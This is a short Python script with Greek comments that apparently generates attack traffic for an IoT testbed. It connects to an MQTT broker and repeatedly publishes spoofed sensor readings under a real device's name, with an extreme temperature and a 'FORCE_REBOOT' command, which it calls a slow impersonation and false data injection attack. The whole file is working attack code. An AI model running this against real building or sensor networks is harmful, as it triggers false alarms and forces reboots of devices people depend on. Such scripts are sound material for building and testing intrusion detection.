import random
import paho.mqtt.client as mqtt
import time
import json
import socket
import os


# Παίρνουμε το όνομα του Pod
pod_id = socket.gethostname()
BROKER = os.getenv("BROKER_HOST", "emqx")
CLIENT_ID = f"Attack_{os.path.basename(__file__)}_{pod_id}"
# Προαιρετικό delay για να μην ξεκινήσουν όλα μαζί
delay = int(os.getenv("INITIAL_DELAY", "0"))
time.sleep(delay)
client = mqtt.Client(client_id=CLIENT_ID)
client.connect(BROKER, 1883)
client.loop_start()

print("[!] Starting Slow Impersonation Attack...")

try:
    while True:

        time.sleep(random.uniform(5, 15))

        # ακραίες τιμές που στοχεύουν να ενεργοποιήσουν λάθος συναγερμούς
        payload = {
            "device": "TempSensor_R1_1",
            "temp": 99.9,  # False Data Injection
            "humidity": 0.0,
            "cmd": "FORCE_REBOOT",  # Κακόβουλο κλειδί
        }

        client.publish("building/floor1/roomA/temp", json.dumps(payload), qos=1)
except KeyboardInterrupt:
    client.disconnect()
